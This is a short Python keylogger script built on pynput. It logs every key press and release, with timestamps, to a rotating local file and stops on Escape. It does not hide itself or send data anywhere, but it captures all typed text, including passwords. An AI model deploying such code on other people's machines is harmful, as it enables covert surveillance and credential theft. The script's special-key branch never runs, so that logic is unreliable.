from pynput.keyboard import Key, Listener
import logging
from logging.handlers import RotatingFileHandler

log_file = "key_log.txt"
handler = RotatingFileHandler(log_file, maxBytes=5*1024*1024, backupCount=3)  # 5MB log file, 3 backups
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[handler]
)

def log_key_press(key):
    logging.info(f"Key Pressed: {key.char}")

def log_special_key(key):
    special_keys = {
        Key.space: "Space",
        Key.enter: "Enter",
        Key.tab: "Tab",
        Key.shift: "Shift",
        Key.ctrl_l: "Left Ctrl",
        Key.ctrl_r: "Right Ctrl",
        Key.alt_l: "Left Alt",
        Key.alt_r: "Right Alt",
        Key.esc: "Escape",
        Key.caps_lock: "Caps Lock",
    }
    key_name = special_keys.get(key, f"Special Key [{key}]")
    logging.info(f"Special Key Pressed: {key_name}")

# Function to record key presses
def on_press(key):
    try:
        # Log alphanumeric keys
        if hasattr(key, 'char') and key.char:
            log_key_press(key)
    except AttributeError:
        # Handle special keys
        log_special_key(key)

# Function to stop listener on key release and log the release event
def on_release(key):
    logging.info(f"Key Released: {key}")
    if key == Key.esc:  # Stop listener when Escape key is pressed
        logging.info("Escape key pressed. Stopping listener.")
        return False

# Start the key listener
def start_keylogger():
    logging.info("Keylogger started. Press 'Esc' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the keylogger
if __name__ == "__main__":
    start_keylogger()
